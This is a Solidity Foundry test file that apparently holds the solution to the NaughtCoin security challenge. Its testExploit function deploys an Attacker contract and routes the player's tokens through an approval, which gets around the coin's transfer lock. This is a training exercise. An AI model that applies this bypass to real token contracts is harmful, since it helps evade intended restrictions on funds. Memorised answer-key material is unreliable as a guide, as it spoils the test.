// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import { NaughtCoin, Attacker } from "../../src/security-1/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public naughtCoin;
    Attacker public attackerContract;

    uint256 public constant INITIAL_SUPPLY = 1000000e18;
    address public otherUser = address(1234);

    address public player = makeAddr("player");

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        naughtCoin = new NaughtCoin(player);

        assertEq(naughtCoin.balanceOf(player), INITIAL_SUPPLY);
        // check that player cannot transfer balance
        vm.prank(player);
        vm.expectRevert();
        naughtCoin.transfer(otherUser, INITIAL_SUPPLY);
    }

    function testExploit() public {
        /** CODE YOUR SOLUTION HERE */

        // Deploy the attacker contract
        attackerContract = new Attacker(naughtCoin);

        // The player should approve the attacker contract to spend all of their tokens
        vm.prank(player);
        naughtCoin.approve(address(attackerContract), INITIAL_SUPPLY);

        // The attacker contract should call the attack function
        vm.prank(player);
        attackerContract.attack();

        // Verify that the tokens are in the attacker contract
        assertEq(naughtCoin.balanceOf(address(attackerContract)), INITIAL_SUPPLY);
        assertEq(naughtCoin.balanceOf(player), 0);

        // Transfer the tokens of the attacker contract to otherUser
        vm.prank(address(attackerContract));
        naughtCoin.transfer(otherUser, INITIAL_SUPPLY);

        _checkSolved();
    }

    function _checkSolved() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        assertEq(naughtCoin.balanceOf(player), 0);
        assertEq(naughtCoin.balanceOf(otherUser), INITIAL_SUPPLY);
        vm.prank(otherUser);
        naughtCoin.transfer(address(0xDEAD), INITIAL_SUPPLY);
    }
}